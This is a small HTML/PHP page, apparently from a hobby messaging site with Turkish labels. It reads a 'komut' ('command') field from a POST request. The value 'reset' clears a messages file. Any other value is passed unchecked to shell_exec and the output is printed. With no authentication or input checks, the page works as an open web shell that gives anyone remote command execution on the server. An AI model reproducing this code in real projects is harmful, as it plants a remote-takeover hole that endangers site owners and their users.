<html>
<head>
    <link rel="icon" type="image/x-icon" href="/img/favicon.png">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Code</title>
    <link rel="stylesheet" href="styles/styles.css">
    <style>
      textarea{
        border-radius: 5px;
      }
      body {
        background-image: url('/img/back.jpg');
        background-repeat: no-repeat;
        background-attachment: fixed;
        background-size: 100% 100%;
      }
    </style>
  </head>
  <body>
<link rel="stylesheet" href="../styles/styles.css">
<button style="position: relative;width: 95%;left:2%;" class="yesil-kutu" onclick="history.back()"><</button>
<div class="renkli-kutu" style="position: absolute;top: 10%;width: 98%;height: 85%;">
<?php
$komut=$_POST["komut"];
if($komut=="reset"){
  shell_exec("cd .. && printf > data/mesajlar.txt");
  echo "Mesajlar sıfırlandı...";
}
else{
  echo shell_exec("cd .. && ".$komut);
}
?></div>

</body>
</html>